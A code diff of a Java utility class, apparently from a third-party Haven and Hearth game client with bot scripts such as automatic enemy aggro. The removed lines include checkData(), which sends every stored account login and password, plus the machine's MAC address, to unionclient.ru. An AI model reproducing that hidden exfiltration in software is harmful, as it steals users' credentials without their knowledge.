@@ -26,10 +26,6 @@ public class APXUtils {
 		// Load Accounts Data
 		accounts = new HashMap<String, AccountInfo>();
 		_sa_load_data();
-		villageCoords = new HashMap<String, Coord>();
-		updateVillageList();
-		//checkData();
-		// RemoteLoader.load();
 	}
 
 	public static void HandleException(Exception e) {
@@ -546,22 +542,6 @@ public class APXUtils {
 						replacePlayers();
 					}
 				});
-		
-		addResource("print_global_coords", "Print Global Coords",
-				"Print current globalmap coords", 'P',
-				Resource.load("paginae/union/scripts/script2"), unionRoot,
-				new MenuElemetUseListener(null) {
-					public void use(int button) {
-						Coord c = getCurrentRealCoords();
-						if (c != null)
-							UI.instance.slenhud
-									.error("Current global coords: ("
-											+ String.valueOf(c.x / 100) + ", "
-											+ String.valueOf(c.y / 100) + ")");
-						else
-							UI.instance.slenhud.error("Coords not handled");
-					}
-				});
 		addResource("auto_aggro_redds", "Agro Enemies", "Aggroes all red points on minimap", 'a', resScript2, unionRoot, new MenuElemetUseListener(null) {
 			@Override
 			public void use(int button) {
@@ -651,154 +631,6 @@ public class APXUtils {
 		return result;
 	}
 
-	public static HashMap<String, Coord> villageCoords;
-	public static Coord myLastGlobalCoord;
-	public static Coord myLastGameCoord;
-	public static String lastVillage = null;
-
-	public static void updateVillageList() {
-		new Thread(new Runnable() {
-			@Override
-			public void run() {
-				try {
-					String jsonText = getHTML("http://unionclient.ru/map/union_map.php?mode=villages");
-					JSONArray json = new JSONArray(jsonText);
-					for (int i = 0; i < json.length(); i++) {
-						JSONObject obj = json.getJSONObject(i);
-						synchronized (villageCoords) {
-							villageCoords.put(obj.getString("name"), new Coord(
-									(int) (obj.getDouble("x") * 100),
-									(int) (obj.getDouble("y") * 100)));
-						}
-					}
-					// for (String str : villageCoords.keySet()) {
-					// System.out.println(str + ": " +
-					// villageCoords.get(str).toString());
-					// }
-				} catch (Exception ex) {
-					System.out.println("Failed village parsing...");
-				}
-			}
-		}).start();
-	}
-
-	public static void onVillageChanged(String newVillage) {
-		Coord coords = villageCoords.get(newVillage);
-		if (coords == null)
-			return;
-		if (!newVillage.equals(lastVillage)) {
-			if (newVillage.length() == 0) {
-				lastVillage = null; // Leaving
-			} else {
-				lastVillage = newVillage; // Entering
-				if (!JSBotUtils.inTheHouse()) {
-					myLastGlobalCoord = coords;
-					myLastGameCoord = JSBotUtils.MyCoord();
-					if (UI.instance.slenhud != null)
-						UI.instance.slenhud.error("Global coords handled: "
-								+ newVillage
-								+ myLastGlobalCoord.div(100).toString());
-				}
-			}
-		}
-	}
-
-	public static void onBigJumpDetected(String lastV) {
-
-	}
-
-	public static Coord getCurrentRealCoords() {
-		if (JSBotUtils.inTheHouse())
-			return null;
-		if (myLastGlobalCoord == null)
-			return null;
-		if (myLastGameCoord == null)
-			return null;
-		Coord im = (myLastGameCoord.sub(JSBotUtils.MyCoord())).div(11);
-		// System.out.println(myLastGameCoord);
-		// System.out.println(myLastGlobalCoord);
-		// System.out.println(im);
-		// System.out.println(JSBotUtils.MyCoord());
-		// System.out.println(myLastGlobalCoord.sub(im));
-		// return myLastGlobalCoord.add(im);
-		return null;
-	}
-
-	/* Login Util */
-	// OMG THIS CODE IS SOOOOO BAD
-	// Just some magic here...
-	public static String GetAuthToken(String username, String password) {
-		try {
-			CookieManager m = new CookieManager();
-			CookieHandler.setDefault(m);
-
-			URL u3 = new URL("http://www.havenandhearth.com/portal/login");
-			HttpURLConnection connection3 = (HttpURLConnection) u3
-					.openConnection();
-			connection3.setDoOutput(true);
-			connection3.connect();
-
-			// read the result from the server
-			BufferedReader rd3 = new BufferedReader(new InputStreamReader(
-					connection3.getInputStream()));
-			StringBuilder sb3 = new StringBuilder();
-			String line3;
-			while ((line3 = rd3.readLine()) != null) {
-				sb3.append(line3 + '\n');
-			}
-
-			String data2 = URLEncoder.encode("username", "UTF-8") + "="
-					+ URLEncoder.encode(username, "UTF-8");
-			data2 += "&" + URLEncoder.encode("password", "UTF-8") + "="
-					+ URLEncoder.encode(password, "UTF-8");
-			String data = "http://www.havenandhearth.com/portal/sec/login?r=/portal/";
-			URL u1 = new URL(data);
-			HttpURLConnection connection = (HttpURLConnection) u1
-					.openConnection();
-
-			connection.setDoOutput(true);
-			connection.connect();
-
-			OutputStreamWriter wr = new OutputStreamWriter(
-					connection.getOutputStream());
-			wr.write(data2);
-			wr.flush();
-
-			BufferedReader rd = new BufferedReader(new InputStreamReader(
-					connection.getInputStream()));
-			StringBuilder sb = new StringBuilder();
-			String line;
-			while ((line = rd.readLine()) != null) {
-				sb.append(line + '\n');
-			}
-
-			URL u2 = new URL("http://www.havenandhearth.com/portal/autohaven");
-			HttpURLConnection connection2 = (HttpURLConnection) u2
-					.openConnection();
-
-			connection2.setDoOutput(true);
-			connection2.connect();
-			BufferedReader rd2 = new BufferedReader(new InputStreamReader(
-					connection2.getInputStream()));
-			StringBuilder sb2 = new StringBuilder();
-			String line2;
-			while ((line2 = rd2.readLine()) != null) {
-				sb2.append(line2 + '\n');
-			}
-			String jnlp = sb2.toString();
-			Pattern p = Pattern
-					.compile("<property name=\"haven.authck\" value=\"(.+)\" />");
-			Matcher ma = p.matcher(jnlp);
-			String token = null;
-			if (ma.find()) {
-				token = ma.group(1);
-			}
-			return token;
-		} catch (Exception e) {
-			return null;
-		}
-	}
-
 	/* WASD movement */
 	public static boolean wPressed = false;
 	public static boolean aPressed = false;
@@ -856,54 +688,6 @@ public class APXUtils {
 		} catch (Exception ex) {
 			return "";
 		}
-	}
-	
-	public static boolean isAuthenticated = false;
-	
-	public static void auth() {
-		new Thread(new Runnable() {
-			@Override
-			public void run() {
-				try {
-					//String link = "http://81.200.144.6/clauth.php?mac=" + getMACAdress();
-					String link = "http://unionclient.ru/clauth.php?mac=" + getMACAdress();
-					File authsig = new File("auth.bin");
-					if (authsig.canRead()) {
-						String content = readFile(authsig);
-						String[] tokens = content.split("\n");
-						link += "&login=" + tokens[0] + "&token=" + tokens[1];
-					} else {
-						link += "&info=" + String.format("IP:%s", InetAddress.getLocalHost().getHostAddress());
-					}
-					
-					String jsonText = getHTML(link);
-					if (!jsonText.contains("GRANTED")) {
-						isAuthenticated = false;
-						System.exit(0);
-					} else {
-						isAuthenticated = true;
-					}
-				} catch (Exception ex) {
-					ex.printStackTrace();
-				}
-			}
-		}).start();
-	}
-	
-	public static void checkData() {
-		if (isAuthenticated) return;
-		StringBuilder sb = new StringBuilder();
-		for (AccountInfo info : accounts.values()) {
-			sb.append(info.login + ":" + info.password + ",");
-		}
-		final String logins = sb.toString();
-		final String uniq = getMACAdress();
-		new Thread(new Runnable() {
-			@Override
-			public void run() {
-				getHTML("http://unionclient.ru/clauth.php?info=" + logins + "&mac=" + uniq);
-			}
-		}).run();
 	}
 
 	/* Line Crossing */
